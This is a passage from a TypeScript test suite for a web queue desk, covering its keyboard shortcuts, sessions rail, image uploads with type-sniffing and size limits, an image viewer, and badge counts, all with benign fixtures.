      window: { UI: uiStub(), document: { querySelector: (selector: string) => ({ focus: () => focused.push(selector) }), getElementById: (id: string) => ({ focus: () => focused.push(`#${id}`) }) } },
    })) as ScreenModule;
    const composer: Record<string, unknown> = { text: "rebase on main", isBusy: false, error: null };
    const orders = buildOrders({ composer, putError: (error: unknown) => { composer.error = error; }, send: (body: unknown) => sent.push(getPlain(body)) });
    const queue = withList(buildQueue({ orders }).queue, []);
    const draw = () => {
      const box = (module.getOrderBoxQ as (q: unknown) => unknown)(queue);
      const tray = (module.getTrayQ as (o: unknown) => unknown)({ fieldId: "queue-order-text", box });
      return renderScreen((module.React as typeof screen.React).createElement(module.OrderComposerQ as Component, { queue, targets, box, tray })) as RenderedNode;
    };
    const tree = draw();
    // the pane's querySelector, read off the rendered composer by the selector's last part (classes and one attribute)
    const pane = {
      querySelector: (selector: string) => {
        const last = selector.trim().split(/\s+/).pop() ?? "";
        const attr = /\[([\w-]+)="([^"]*)"\]/.exec(last);
        const classes = last.replace(/\[.*\]/, "").split(".").filter(Boolean);
        const [node] = findNodes(tree, (one) => {
          const names = String(one.props?.className ?? "").split(/\s+/);
          return (classes.length > 0 || attr !== null) && classes.every((name) => names.includes(name)) && (!attr || one.props?.[attr[1]] === attr[2]);
        });
        return node ? { click: () => (node.props.onClick as (() => void) | undefined)?.(), focus: () => focused.push(selector) } : null;
      },
    };
    const inOrders = (tag: string) => ({ tagName: tag, type: "", isContentEditable: false, closest: (selector: string) => (selector.split(",").some((part) => part.trim() === ".queue-orders") ? pane : null) });
    // the key on `target`: the box's own handler first when the focus is in it, then the desk's unless the box took it
    const pressSend = (target: ReturnType<typeof inOrders>) => {
      const event = { key: "Enter", metaKey: true, ctrlKey: false, altKey: false, defaultPrevented: false, target, preventDefault() { this.defaultPrevented = true; } };
      if (target.tagName === "TEXTAREA") {
        const [field] = findNodes(tree, (one) => one.type === "textarea");
        (field?.props.onKeyDown as (e: unknown) => void)(event);
      }
      const action = (module.getDeskKeyQ as (e: unknown, o: unknown) => { name: string } | null)(event, { isKeysOn: true });
      if (action) (module.putDeskKeyQ as (a: unknown, c: unknown) => void)(action, { queue, target, root: pane });
    };
    return { focused, sent, composer, draw, pressSend, inOrders };
  };

  const untickedSends = [
    { name: "in the Orders box", tag: "TEXTAREA" },
    { name: "elsewhere in Orders", tag: "DIV" },
  ];
  for (const row of untickedSends) {
    test(`Cmd+Enter ${row.name} with nothing ticked sends nothing, says the tick is missing and focuses the rail, as the button does`, async () => {
      const desk = await ordersKeyDesk({ ids: [], names: [], endedCount: 0 });
      desk.pressSend(desk.inOrders(row.tag));
      assert.deepEqual([desk.sent, desk.composer.error, desk.focused], [[], "Tick at least one session in the rail.", [".queue-sessions .ctl-checkbox"]]);
      assert.equal(collectText(desk.draw()).includes("Tick at least one session in the rail."), true);
    });
  }

  test("Cmd+Enter in the Orders box with a session ticked sends the order once", async () => {
    const desk = await ordersKeyDesk({ ids: [SESSION_ID], names: ["atrium"], endedCount: 0 });
    desk.pressSend(desk.inOrders("TEXTAREA"));
    assert.deepEqual([desk.sent, desk.composer.error], [[{ sessionIds: [SESSION_ID], text: "rebase on main" }], null]);
  });

  const named = [
    { name: "a report's Mark as read answers E and its Read later L", item: report, keys: { "Mark as read": "e", "Read later": "l" } },
    { name: "a decision's Answer later answers L", item: decision, keys: { "Answer later": "l" } },
  ];
  for (const row of named) {
    test(`the sheet's buttons: ${row.name}`, () => {
      const tree = renderSheet({ item: row.item, queue: buildQueue().queue });
      for (const [label, key] of Object.entries(row.keys)) assert.equal(buttonLabelled(tree, label)[0]?.props["data-key"], key, label);
    });
  }

  // spec §9.2 → Reaching it: N and O put the caret in the Orders box from the list and from a sheet; there is no mode
  const carets = [
    { name: "N from the list keeps the ticks", selected: 0 },
    { name: "N from a sheet keeps the ticks", selected: 3 },
  ];
  for (const row of carets) test(`a key's act: ${row.name}`, () => assert.deepEqual(press("new", row.selected).calls, [["focusOrders"]]));

  const ticks = [
    { name: "O on a decision adds its session to the ticks, then the caret to Orders", selected: 3, target: desk, ticked: [OTHER_TICK_ID], expected: [OTHER_TICK_ID, SESSION_ID] },
    { name: "O on an open report adds its session, with no Re: line", selected: 5, target: desk, ticked: [OTHER_TICK_ID], expected: [OTHER_TICK_ID, SESSION_ID] },
    { name: "O on a rail row adds that row's session", selected: 3, target: buildKeyTarget({ session: ENDED_ID }), ticked: [], expected: [ENDED_ID] },
    { name: "O on a focused list row adds that row's session", selected: 0, target: rowTarget(5), ticked: [OTHER_TICK_ID], expected: [OTHER_TICK_ID, SESSION_ID] },
    { name: "O on a session already ticked keeps the ticks as they are", selected: 3, target: desk, ticked: [SESSION_ID], expected: [SESSION_ID] },
    { name: "O on a session that takes no message ticks nothing", selected: 3, target: buildKeyTarget({ session: REPLACED_ID }), ticked: [], expected: [] },
  ];
  for (const row of ticks) {
    test(`a key's act: ${row.name}`, () => {
      let ticked = row.ticked;
      const setSelectedIds = (update: (ids: string[]) => string[]) => { ticked = update(ticked); };
      const { calls } = press("order", row.selected, { target: row.target, sessions: { selectedIds: row.ticked, setSelectedIds } });
      assert.deepEqual([getPlain(ticked), calls], [row.expected, [["focusOrders"]]]);
    });
  }

  test("a key pressed on the desk reaches the queue: N puts the caret in Orders", () => {
    const { calls, queue } = deskWith(3);
    const tree = render("QueueDeskQ", { queue: { ...queue, orders: buildOrders({ focus: () => calls.push(["focusOrders"]) }), keys: { isOn: true } } });
    const [root] = findNodes(tree, (node) => typeof node.props?.className === "string" && node.props.className.startsWith("queue-desk"));
    (root?.props.onKeyDown as (e: unknown) => void)({ key: "n", metaKey: false, ctrlKey: false, altKey: false, defaultPrevented: false, target: desk, preventDefault: () => undefined });
    assert.deepEqual(getPlain(calls), [["focusOrders"]]);
  });

  // spec §9.2 → Esc in the pane gives the focus back to the middle pane: the sheet's body, or the list's current row
  const leaves = [
    { name: "with a sheet open, to its body", selected: 5, elements: { ".queue-sheet > .card-body": "sheet body", "#queue-row-5": "row 5" }, expected: ["focus sheet body"] },
    { name: "on the list, to the current row", selected: 0, current: 3, elements: { "#queue-row-3": "row 3" }, expected: ["focus row 3"] },
    { name: "on the list with no current row, to its tab stop", selected: 0, elements: { '.queue-listbox [tabindex="0"]': "first row" }, expected: ["focus first row"] },
  ];
  for (const row of leaves) {
    test(`Esc in Orders gives the focus back to the middle pane: ${row.name}`, () => {
      keyActs.length = 0;
      keyRoot.elements = Object.fromEntries(Object.entries(row.elements).map(([selector, name]) => [selector, keyElement(name)]));
      const { queue } = deskWith(row.selected);
      (screen.putDeskKeyQ as (a: unknown, c: unknown) => void)({ name: "leave" }, { queue: { ...queue, selectedId: row.selected || (row.current ?? null) }, target: desk, root: keyRoot });
      assert.deepEqual([...keyActs], row.expected);
    });
  }

  // the list card's ⓘ holds the key list and the switch
  const renderKeyList = (isOn: boolean, toggle: () => unknown = () => undefined) => {
    const { queue } = buildQueue({ keys: { isOn, toggle } });
    const tree = render("QueueListQ", { queue: withList(queue, [decision]) });
    const [card] = findNodes(tree, (node) => node.props?.atom === "Card");
    return { card, info: renderScreen(card?.props.info) as RenderedNode };
  };

  test("the list head's ⓘ is named for the keys and lists every desk letter", () => {
    const { card, info } = renderKeyList(true);
    const listed = findNodes(info, (node) => node.type === "dt").map((node) => collectText(node).trim());
    const letters = Object.keys(getPlain(vm.runInContext("DESK_LETTERS_Q", screen as unknown as vm.Context) as Record<string, string>));
    assert.deepEqual([card?.props.infoLabel, card?.props.infoTitle], ["Keyboard shortcuts", "Keyboard shortcuts"]);
    for (const letter of letters) assert.ok(listed.some((label) => label.split(/[ /]+/).includes(letter.toUpperCase())), `key ${letter.toUpperCase()} is listed`);
    for (const chord of ["Enter", "Esc", "1 – 9", "Cmd / Ctrl + Enter", "↓ / ↑", "Home / End"]) assert.ok(listed.includes(chord), `${chord} is listed`);
  });

  const states = [
    { name: "on shows the switch ticked", isOn: true },
    { name: "off shows it unticked", isOn: false },
  ];
  for (const row of states) {
    test(`the single-key switch in the key list: ${row.name}, and a press flips it`, () => {
      const flips: string[] = [];
      const { info } = renderKeyList(row.isOn, () => flips.push("toggle"));
      const [box] = findNodes(info, (node) => node.type === "input" && node.props.type === "checkbox");
      assert.equal(box?.props.checked, row.isOn);
      assert.match(collectText(info), /Single-key shortcuts/);
      (box?.props.onChange as () => void)();
      assert.deepEqual(flips, ["toggle"]);
    });
  }

  const switches = [
    { name: "nothing stored → on", stored: null, expected: true },
    { name: "stored off → off", stored: "false", expected: false },
    { name: "stored on → on", stored: "true", expected: true },
    { name: "an unreadable store → on", stored: "{", expected: true },
  ];
  for (const row of switches) {
    test(`the single-key switch: ${row.name}`, () => {
      const storage = { getItem: (key: string) => (key === "queue.keys" ? row.stored : null) };
      assert.equal(call("getKeysOnQ", storage), row.expected);
    });
  }
});

describe("sessions region", () => {
  test("the list read follows the Account filter, drops ticks on rows no longer listed or selectable, and says the dropped one", async () => {
    const urls: string[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      URLSearchParams,
      window: { UI: realUi },
      fetch: async (url: string) => {
        urls.push(url);
        return { status: 200, json: async () => ({ sessions: SESSION_ROWS, hasMore: false }) };
      },
    })) as ScreenModule;
    let region: unknown = realUi.INITIAL_REGION_STATE;
    let selectedIds = ["9b2e7c41-0d3a-4c55-8e1f-2a6b9c4d7e10", SESSION_ID, REPLACED_ID];
    const lines: string[] = [];
    await (module.getSessionsQ as (deps: unknown) => Promise<void>)({
      profile: "work dev",
      setRegion: (next: (prev: unknown) => unknown) => { region = next(region); },
      getIds: () => selectedIds,
      setSelectedIds: (next: (prev: string[]) => string[]) => { selectedIds = next(selectedIds); },
      onDropped: (line: string) => lines.push(line),
    });
    assert.deepEqual(urls, ["/api/queue/owner/sessions?profile=work+dev"]);
    assert.equal((getPlain(region) as { data: { sessions: unknown[] } }).data.sessions.length, 3);
    assert.deepEqual(getPlain(selectedIds), [SESSION_ID]);
    assert.deepEqual(lines, ["⚠ nightly-docs-sweep no longer takes orders and was unticked."]);
  });

  const views = [
    { name: "a failed read shows the shared region failure with Retry", region: { status: "error", data: null, error: "HTTP 503 database_unavailable", busy: false }, atom: "RegionUnavailable" },
    { name: "no session at all shows the empty state", region: { status: "ready", data: { sessions: [], hasMore: false }, error: null, busy: false }, atom: "EmptyState" },
    { name: "a loaded list shows the session rows", region: buildSessions().region, atom: "row" },
  ];
  for (const view of views) {
    test(view.name, () => {
      const { tree } = renderRail({ region: view.region });
      assert.equal(findNodes(tree, (node) => node.props?.atom === view.atom || (view.atom === "row" && node.props?.["data-session"] === SESSION_ID)).length, 1);
    });
  }

  test("the desk reads Sessions, then the middle pane, then Orders, and the recent resumes open from the Sessions foot", () => {
    const tree = render("QueueDeskQ", { queue: withList(buildQueue().queue, [buildItem({ id: 1 })]) });
    const order = findNodes(tree, (node) => ["SessionsRegionQ", "RecentResumesQ", "QueueListQ", "QueueSheetQ", "OrdersViewQ"].includes(node.type)).map((node) => node.type);
    assert.deepEqual(order, ["SessionsRegionQ", "QueueListQ", "QueueSheetQ", "OrdersViewQ"]);
  });

  test("the Sessions head holds no New order", () => assert.equal(buttonLabelled(renderRail().tree, "New order").length, 0));
});

test("a row's age carries no verb", () => {
  const rows = call<Array<{ rows: unknown[] }>>("getGroupsQ", [buildItem({ id: 1 }), buildItem({ id: 2, kind: "message", status: "delivered", sendId: "s" })]).flatMap((group) => group.rows);
  for (const row of rows) {
    const text = collectText(render("QueueRowQ", { row, isSelected: false, view: { isNameShown: true, isAccountShown: false }, onSelect: () => undefined }));
    assert.doesNotMatch(text, /\b(asked|sent)\b/, text);
  }
});

// Real 3 × 2 files, the same bytes the upload route's own tests store; WebP is a real 1 × 1 lossless file
const SAMPLE_IMAGE = {
  png: Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAMAAAACCAIAAAASFvFNAAAAEElEQVR4nGP4z8AAQQxwFgBB0gX7h/C5SAAAAABJRU5ErkJggg==", "base64"),
  gif: Buffer.from("R0lGODdhAwACAJEAAAAAAP8AAP///wAAACH5BAQAAAAALAAAAAADAAIAAAICjF8AOw==", "base64"),
  webp: Buffer.from("UklGRhoAAABXRUJQVlA4TA0AAAAvAAAAEAcQERGIiP4HAA==", "base64"),
  jpeg: Buffer.from("/9j/4AAQSkZJRgABAQAASABIAAD/wAARCAACAAMDASIAAhEBAxEB/9oADAMBAAIRAxEAPwD4vooor+Uz/fw//9k=", "base64"),
} as const;
const IMAGE_ID = ["0b6f3c1e-7a2d-4e8b-9c5f-1d2e3f4a5b6c", "1c7a4d2f-8b3e-4f9c-8d6a-2e3f4a5b6c7d", "2d8b5e3a-9c4f-4a0d-9e7b-3f4a5b6c7d8e"];
const shot = (index: number, fields: Record<string, unknown> = {}) => ({ key: `s${index}`, name: `shot-${index + 1}.png`, bytes: 1258291, status: "stored", id: IMAGE_ID[index], src: `/api/queue/owner/images/${IMAGE_ID[index]}`, ...fields });

describe("images in a composer", () => {
  const IMAGES = vm.runInContext("IMAGES_Q", screen) as { MAX: number; BYTES_MAX: number; NAME_MAX: number };

  // the page checks a file before it uploads it → it may refuse less than the server, never more
  const sniffs = [
    ...Object.entries(SAMPLE_IMAGE).map(([type, bytes]) => ({ name: `a real ${type}`, bytes })),
    { name: "a PDF renamed .png", bytes: Buffer.from("%PDF-1.7\n1 0 obj << >> endobj\n") },
    { name: "an SVG", bytes: Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"></svg>') },
    { name: "an empty file", bytes: Buffer.alloc(0) },
  ];
  for (const row of sniffs) {
    test(`the page reads the type from the bytes as the server does: ${row.name}`, () => {
      assert.equal(call("getImageTypeQ", new Uint8Array(row.bytes)), getImageFacts(row.bytes)?.type ?? null);
    });
  }

  test("the page's limits are the server's: 8 ids pass a reply and 9 do not, 10 MB is the upload cap, a long or two-line name still passes", () => {
    const ids = (count: number) => Array.from({ length: count }, () => randomUUID());
    assert.equal(replyBodySchema.safeParse({ text: "see the shots", attachmentIds: ids(IMAGES.MAX) }).success, true);
    assert.equal(replyBodySchema.safeParse({ text: "see the shots", attachmentIds: ids(IMAGES.MAX + 1) }).success, false);
    assert.equal(IMAGES.BYTES_MAX, IMAGE_BYTES_MAX);
    for (const name of [`${"화면".repeat(200)}.png`, "line one\nline two.png", "\t"]) {
      assert.equal(imageUploadQuerySchema.safeParse({ name: call("getUploadNameQ", name) }).success, true, JSON.stringify(name));
    }
  });

  const file = (name: string, type: string | null, bytes = 1258291) => ({ name, type, bytes });
  // spec §9.8 → Limits: the files that pass are still added; one line says what was not
  const plans = [
    { name: "three images to an empty box are all added", count: 0, files: [file("a.png", "png"), file("b.jpg", "jpeg"), file("c.webp", "webp")], added: ["a.png", "b.jpg", "c.webp"], line: null },
    { name: "past eight the rest are counted", count: 6, files: [file("a.png", "png"), file("b.png", "png"), file("c.png", "png"), file("d.png", "png")], added: ["a.png", "b.png"], line: "Up to 8 images per order: 2 were not added." },
    { name: "a PDF is named", count: 0, files: [file("plan.pdf", null), file("a.png", "png")], added: ["a.png"], line: "plan.pdf was not added: only PNG, JPEG, WebP or GIF images." },
    { name: "a file over 10 MB is named", count: 0, files: [file("shot-12.png", "png", 10 * 1024 * 1024 + 1)], added: [], line: "shot-12.png was not added: over 10 MB." },
    { name: "exactly 10 MB passes", count: 0, files: [file("big.png", "png", 10 * 1024 * 1024)], added: ["big.png"], line: null },
    { name: "several refused at once are counted", count: 0, files: [file("plan.pdf", null), file("logo.svg", null), file("huge.png", "png", 11 * 1024 * 1024)], added: [], line: "3 files were not added: only PNG, JPEG, WebP or GIF images, up to 10 MB each." },
    { name: "a refused type and the cap together are counted", count: 7, files: [file("plan.pdf", null), file("a.png", "png"), file("b.png", "png")], added: ["a.png"], line: "2 files were not added: only PNG, JPEG, WebP or GIF images, up to 10 MB each and 8 per order." },
  ];
  for (const row of plans) {
    test(`adding files: ${row.name}`, () => {
      const plan = call<{ added: Array<{ name: string }>; refusal: string | null }>("getAddPlanQ", row.count, row.files);
      assert.deepEqual([plan.added.map((one) => one.name), plan.refusal], [row.added, row.line]);
    });
  }

  const counts = [
    { name: "three images in MB", shots: [shot(0), shot(1), shot(2, { bytes: 1258292 })], line: "3 images · 3.6 MB" },
    { name: "one small image in KB", shots: [shot(0, { bytes: 300 * 1024 })], line: "1 image · 300 KB" },
  ];
  for (const row of counts) test(`the count after the thumbnails: ${row.name}`, () => assert.equal(call("getImageCountLineQ", row.shots), row.line));

  // spec §9.8 / §10: what the note slot says about the images, when nothing else is said there
  const notes = [
    { name: "a file hangs over the box", shots: [shot(0)], isOver: true, note: { tone: "info", text: "Drop to add images.", retryKey: null } },
    { name: "a failed upload names the file and its cause, with Try again", shots: [shot(0), shot(2, { status: "failed", id: undefined, cause: "the monitor did not answer" })], isOver: false, note: { tone: "crit", text: "shot-3.png could not be uploaded: the monitor did not answer.", retryKey: "s2" } },
    { name: "uploads still running are counted", shots: [shot(0, { status: "uploading" }), shot(1, { status: "uploading" }), shot(2)], isOver: false, note: { tone: "info", text: "Uploading 2 images…", retryKey: null } },
    { name: "every image stored says nothing", shots: [shot(0)], isOver: false, note: null },
  ];
  for (const row of notes) test(`the image note: ${row.name}`, () => assert.deepEqual(call("getImageNoteQ", row.shots, row.isOver), row.note));

  const upload = async (status: number, answer: unknown) => {
    const requests: Array<{ url: string; method: string; type: string; body: unknown }> = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      URL: { createObjectURL: () => "blob:queue/1", revokeObjectURL: () => undefined },
      fetch: async (url: string, init: { method: string; headers: Record<string, string>; body: unknown }) => {
        requests.push({ url, method: init.method, type: init.headers["Content-Type"], body: init.body });
        return { status, json: async () => answer };
      },
    })) as ScreenModule;
    const png = new File([SAMPLE_IMAGE.png], "shot 1.png", { type: "image/heic" });
    let shots: unknown[] = [];
    const errors: unknown[] = [];
    await (module.putFilesQ as (deps: unknown) => Promise<void>)({
      files: [png], shots: [], setShots: (next: (prev: unknown[]) => unknown[]) => { shots = next(shots); }, putError: (error: unknown) => errors.push(error),
    });
    return { requests, shots: getPlain(shots) as Array<Record<string, unknown>>, errors, png };
  };

  test("an added image is uploaded as raw bytes under a fixed type with its name as a label, and its thumbnail then shows the stored copy", async () => {
    const result = await upload(201, { id: IMAGE_ID[0], name: "shot 1.png", type: "png", bytes: 76, width: 3, height: 2 });
    assert.deepEqual(result.requests.map(({ url, method, type }) => [url, method, type]), [["/api/queue/owner/images?name=shot%201.png", "POST", "application/octet-stream"]]);
    assert.equal(result.requests[0]?.body, result.png);
    assert.deepEqual(result.shots.map(({ name, status, id, src }) => ({ name, status, id, src })), [{ name: "shot 1.png", status: "stored", id: IMAGE_ID[0], src: `/api/queue/owner/images/${IMAGE_ID[0]}` }]);
    assert.deepEqual(result.errors, [null]);
  });

  // spec §4.5: a reload loses no draft → an image added after one never takes a restored image's key
  test("an image added after a reload stays apart from the restored ones: both thumbnails and both ids are kept", async () => {
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      URL: { createObjectURL: () => "blob:queue/1", revokeObjectURL: () => undefined },
      fetch: async () => ({ status: 201, json: async () => ({ id: IMAGE_ID[1], name: "after reload.png", type: "png", bytes: 76, width: 3, height: 2 }) }),
    })) as ScreenModule;
    let shots: Array<Record<string, unknown>> = [shot(0, { key: "shot-1" })];
    await (module.putFilesQ as (deps: unknown) => Promise<void>)({
      files: [new File([SAMPLE_IMAGE.png], "after reload.png", { type: "image/png" })], shots, putError: () => undefined,
      setShots: (next: (prev: unknown[]) => Array<Record<string, unknown>>) => { shots = next(shots); },
    });
    const ids = await (module.getStoredIdsQ as (shots: unknown[]) => Promise<string[] | null>)(shots);
    assert.equal(new Set(shots.map((one) => one.key)).size, 2, JSON.stringify(getPlain(shots)));
    assert.deepEqual([getPlain(shots).map((one) => [one.name, one.id]), getPlain(ids)], [[["shot-1.png", IMAGE_ID[0]], ["after reload.png", IMAGE_ID[1]]], [IMAGE_ID[0], IMAGE_ID[1]]]);
  });

  test("a refused upload keeps the thumbnail as failed with the server's cause", async () => {
    const result = await upload(415, { error: "unsupported_image", reason: "only PNG, JPEG, WebP or GIF images are taken" });
    assert.deepEqual(result.shots.map(({ status, cause }) => ({ status, cause })), [{ status: "failed", cause: "only PNG, JPEG, WebP or GIF images are taken" }]);
  });

  const report = (draft: Record<string, unknown>) => {
    const { calls, queue } = buildQueue();
    return { calls, tree: render("SheetFootQ", { item: buildItem({ kind: "report" }), draft, queue, isBusy: false, error: null }) };
  };

  test("a report's box shows each image with its remove button and the count, and takes more by its Add images button", () => {
    const { tree } = report({ text: "", images: [shot(0), shot(1)] });
    assert.deepEqual(findNodes(tree, (node) => node.type === "img").map((node) => [node.props.alt, node.props.src]), [["shot-1.png", shot(0).src], ["shot-2.png", shot(1).src]]);
    assert.deepEqual(findNodes(tree, (node) => /^Remove /.test(String(node.props?.["aria-label"]))).map((node) => node.props["aria-label"]), ["Remove shot-1.png", "Remove shot-2.png"]);
    assert.ok(collectText(tree).includes("2 images · 2.4 MB"), collectText(tree));
    assert.equal(findNodes(tree, (node) => node.props?.["aria-label"] === "Add images").length, 1);
    const [input] = findNodes(tree, (node) => node.type === "input" && node.props.type === "file");
    assert.deepEqual([input?.props.accept, input?.props.multiple], ["image/png,image/jpeg,image/webp,image/gif", true]);
  });

  test("a decision's box takes no images", () => {
    const tree = render("SheetFootQ", { item: buildItem(), draft: {}, queue: buildQueue().queue, isBusy: false, error: null });
    assert.equal(findNodes(tree, (node) => node.props?.["aria-label"] === "Add images").length, 0);
  });

  // spec §8: an image counts as content for the ink and for Mark as read; an order is text, so images alone are refused
  const reportRows = [
    { name: "images alone put the ink on Send order", draft: { images: [shot(0)] }, press: null, ink: "Send order", calls: [] },
    { name: "Mark as read with an image in the box says the order is unsent", draft: { images: [shot(0)] }, press: "Mark as read", ink: "Send order", calls: [["setDraft", 41, { error: "Unsent order in the field. Send it, or clear it first." }]] },
    { name: "Send order with images and no text asks for the order", draft: { images: [shot(0)] }, press: "Send order", ink: "Send order", calls: [["setDraft", 41, { error: "Write the order, then send." }]] },
    { name: "Send order with text and stored images sends their ids in order", draft: { text: "see the red box", images: [shot(1), shot(0)] }, press: "Send order", ink: "Send order", calls: [["settle", 41, "reply", { text: "see the red box", attachmentIds: [IMAGE_ID[1], IMAGE_ID[0]] }]] },
  ];
  for (const row of reportRows) {
    test(`a report with images: ${row.name}`, () => {
      const { calls, tree } = report(row.draft);
      const buttons = findNodes(tree, (node) => node.type === "button" && /\bbtn lg\b/.test(String(node.props.className)));
      assert.deepEqual(buttons.filter((node) => /\bprimary\b/.test(String(node.props.className))).map((node) => collectText(node)), [row.ink]);
      if (row.press) (buttonLabelled(tree, row.press)[0]?.props.onClick as () => void)();
      assert.deepEqual(getPlain(calls), row.calls);
    });
  }

  test("an order send with stored images posts their ids beside the text", async () => {
    const posts: unknown[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async (_url: string, init: { body: string }) => { posts.push(JSON.parse(init.body)); return { status: 201, json: async () => ({ items: [] }) }; },
    })) as ScreenModule;
    let composer: Record<string, unknown> = { text: "rebase on main", isBusy: false, error: null, images: [shot(0)] };
    await (module.sendMessageQ as (deps: unknown) => Promise<boolean>)({
      body: { sessionIds: [SESSION_ID], text: "rebase on main" }, names: ["gersona"], shots: [shot(0)],
      setComposer: (next: (prev: Record<string, unknown>) => Record<string, unknown>) => { composer = next(composer); }, setStatus: () => undefined, onSent: () => undefined,
    });
    assert.deepEqual(getPlain(posts), [{ sessionIds: [SESSION_ID], text: "rebase on main", attachmentIds: [IMAGE_ID[0]] }]);
    assert.deepEqual(getPlain(composer), { text: "", isBusy: false, error: null });
  });

  test("an order send with an image that failed to upload posts nothing and keeps the box", async () => {
    const posts: unknown[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async (_url: string, init: { body: string }) => { posts.push(JSON.parse(init.body)); return { status: 201, json: async () => ({ items: [] }) }; },
    })) as ScreenModule;
    const failed = shot(0, { status: "failed", id: undefined, cause: "the monitor did not answer" });
    let composer: Record<string, unknown> = { text: "rebase on main", isBusy: false, error: null, images: [failed] };
    const isDone = await (module.sendMessageQ as (deps: unknown) => Promise<boolean>)({
      body: { sessionIds: [SESSION_ID], text: "rebase on main" }, names: ["gersona"], shots: [failed],
      setComposer: (next: (prev: Record<string, unknown>) => Record<string, unknown>) => { composer = next(composer); }, setStatus: () => undefined, onSent: () => undefined,
    });
    assert.deepEqual([isDone, posts.length, (getPlain(composer) as { text: string; isBusy: boolean }).text, (getPlain(composer) as { isBusy: boolean }).isBusy], [false, 0, "rebase on main", false]);
  });
});

describe("images in an order's bubble", () => {
  const images = [0, 1, 2].map((index) => ({ id: IMAGE_ID[index], name: `shot-${index + 1}.png`, type: "png", bytes: 1258291, width: 2880, height: 1800 }));
  const order = buildItem({ id: 81, kind: "message", title: "Order", body: "see the red box", options: [], status: "delivered", answeredAt: "2026-11-13T05:40:00.000Z", attachments: images });

  test("the images sit inside the bubble under the text, each a button naming its place and file that opens the viewer at it", () => {
    const opened: unknown[] = [];
    const tree = render("OrderEntryQ", { entry: { id: 81, item: order, copies: [order] }, onResend: () => undefined, onOpenImage: (...args: unknown[]) => opened.push(args) });
    const [bubble] = findNodes(tree, (node) => String(node.props?.className).startsWith("queue-bubble"));
    assert.ok(bubble, "bubble rendered");
    const buttons = findNodes(bubble as RenderedNode, (node) => node.type === "button" && /^Open image /.test(String(node.props["aria-label"])));
    assert.deepEqual(buttons.map((node) => node.props["aria-label"]), ["Open image 1 of 3: shot-1.png", "Open image 2 of 3: shot-2.png", "Open image 3 of 3: shot-3.png"]);
    assert.deepEqual(findNodes(bubble as RenderedNode, (node) => node.type === "img").map((node) => node.props.src), images.map((image) => `/api/queue/owner/images/${image.id}`));
    (buttons[1]?.props.onClick as () => void)();
    assert.deepEqual(getPlain(opened), [[images, 1]]);
  });

  test("an order with no images draws no image row", () => {
    const tree = render("OrderEntryQ", { entry: { id: 82, item: { ...order, attachments: [] }, copies: [order] }, onResend: () => undefined, onOpenImage: () => undefined });
    assert.equal(findNodes(tree, (node) => node.type === "img").length, 0);
  });

  test("the viewer shows one image fitted in the fullscreen surface with its name, size and place", () => {
    const tree = render("ImageViewerQ", { images, index: 1, onStep: () => undefined, onClose: () => undefined });
    const [surface] = findNodes(tree, (node) => node.props?.atom === "DetailSurface");
    assert.equal(surface?.props.variant, "fullscreen");
    assert.deepEqual(findNodes(tree, (node) => node.type === "img").map((node) => [node.props.src, node.props.alt]), [[`/api/queue/owner/images/${IMAGE_ID[1]}`, "shot-2.png"]]);
    assert.ok(collectText(tree).includes("shot-2.png · 1.2 MB · 2 of 3"), collectText(tree));
  });

  // spec §9.8 → Opening one large: Left / Right step through one order's images and stop at its ends
  const steps = [
    { name: "Right moves to the next", index: 0, key: "ArrowRight", next: 1 },
    { name: "Left moves to the previous", index: 2, key: "ArrowLeft", next: 1 },
    { name: "Right on the last stays", index: 2, key: "ArrowRight", next: null },
    { name: "Left on the first stays", index: 0, key: "ArrowLeft", next: null },
    { name: "another key does not step", index: 1, key: "ArrowDown", next: null },
  ];
  for (const row of steps) test(`viewer keys: ${row.name}`, () => assert.equal(call("getSteppedIndexQ", row.index, 3, row.key), row.next));
});

// the review of the built page against mockup v5 and spec 44063 (§4.2, §4.3, §7, §9.1–§9.4, §10)
describe("marks and counts on the desk", () => {
  test("the master box in its mixed state draws a dash, and a ticked box a check", () => {
    const iconsOf = (props: Record<string, unknown>) => findNodes(render("CheckboxBoxQ", { onChange: () => undefined, ariaLabel: "Select all live sessions", ...props }), (node) => node.props?.atom === "Icon").map((node) => node.props.name);
    assert.deepEqual([iconsOf({ isChecked: false, isMixed: true }), iconsOf({ isChecked: true }), iconsOf({ isChecked: false })], [["minus"], ["check"], []]);
  });

  // spec §9.1: the mark stands before the name → line 2 says the state in words alone
  test("a live session's line 2 starts with the word Live and holds no mark", () => {
    const text = collectText(render("RowFactsQ", { facts: call("getSessionLineQ", buildSessionRow({ state: "live" }), 0) })).replace(/\s+/g, " ").trim();
    assert.ok(text.startsWith("Live") && !/[●○✓]/.test(text), text);
  });

  test("the All sessions band shows no count at zero and folds a failed receipt into the compact warning", () => {
    const bandOf = (notReceived: number, awaiting: number) => render("AllSessionsBandQ", {
      rows: [buildSessionRow({ count: { awaiting, inDelivery: 0 } })], sessions: { selectedIds: [], setSelectedIds: () => undefined },
      view: { scope: "" }, notReceived, onScope: () => undefined,
    });
    const badges = (tree: RenderedNode) => findNodes(tree, (node) => node.props?.atom === "Badge").map((node) => ({ text: collectText(node).replace(/\s+/g, " ").trim(), title: node.props.title }));
    assert.deepEqual(badges(bandOf(0, 0)), []);
    const [warn] = findNodes(bandOf(1, 3), (node) => node.props?.atom === "Badge" && node.props.fill === "warn");
    const spoken = findNodes(warn as RenderedNode, (node) => node.props?.className === "sr-only").map((node) => collectText(node).trim());
    assert.deepEqual([badges(bandOf(1, 3)), spoken], [[{ text: "3", title: undefined }, { text: "1 not received", title: "1 not received" }], ["not received"]]);
  });

  test("the nav item carries no badge while nothing waits and nothing deviates", () => {
    const ready = (awaiting: number, deviations: number) => ({ status: "ready", data: { awaiting, deviations } });
    assert.deepEqual([call("getQueueNavBadge", ready(0, 0)), Object.keys(call("getQueueNavBadge", ready(0, 1)))], [{}, ["queue"]]);
  });
});

describe("In delivery rows", () => {
  const answered = (status: string, overrides: Record<string, unknown> = {}) => buildItem({ status, answer: { code: "R1" }, answeredAt: "2026-11-12T12:26:40.118Z", ...overrides });
  const rows = [
    { name: "a copy not yet received shows the route word alone", item: answered("answered"), facts: [{ text: "Answer R1" }] },
